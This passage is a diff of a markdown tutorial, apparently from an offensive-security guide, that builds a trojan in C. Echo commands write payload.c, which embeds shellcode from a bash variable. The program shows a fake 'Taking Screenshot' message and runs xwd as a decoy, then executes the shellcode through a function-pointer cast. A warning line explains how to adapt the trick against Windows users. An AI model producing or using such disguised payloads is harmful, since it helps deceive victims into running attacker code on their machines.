@@ -111,7 +111,7 @@ pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
 
 ![pic](http://i65.tinypic.com/2090m12.png)
 
-The shellcode data its now stored inside a bash local variable named **$pa**. This variable its going to be called later to embebbed the shellcode into our C Program while we are creating it using the follow commands of the next grey box.<br />
+The shellcode data its now stored inside a bash local variable named **$pa**. This variable its going to be called in the next exercise (the creation of the C program) to embebbed the shellcode into our C Program while we are creating it.<br />
 
 <br />
 
@@ -126,7 +126,7 @@ echo "unsigned char buf[] = \"$pa\";" >> payload.c
 echo "" >> payload.c
 echo "int main()" >> payload.c
 echo "{" >> payload.c
-echo "  printf(\"\\nPlease Wait, Taking Screenshot ..\n...\", strlen(buf));" >> payload.c
+echo "  printf(\"Please Wait, Taking Screenshot ..\n...\", strlen(buf));" >> payload.c
 echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
 echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
 echo "  void (*ret)() = (void(*)())buf;" >> payload.c
@@ -135,7 +135,8 @@ echo "}" >> payload.c
 ```
 
 ![pic](http://i67.tinypic.com/309rd74.png)
-WARNING: This C Program only works in Linux distros, but with a few modification like the inclusion of **<windows.h>** lib and with a diferent gcc compiler command syntax it can be possible to pull out the same trick agains windows users.<br /> 
+WARNING: This C Program only works in Linux distros, but with a few modifications like the inclusion of **<windows.h>**<br />
+lib and with a diferent [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) compiler command syntax, it can be possible to pull out the same trick agains windows users. (GCC can also compile C sourcecode into executables .exe)<br /> 
 
 <br />
 
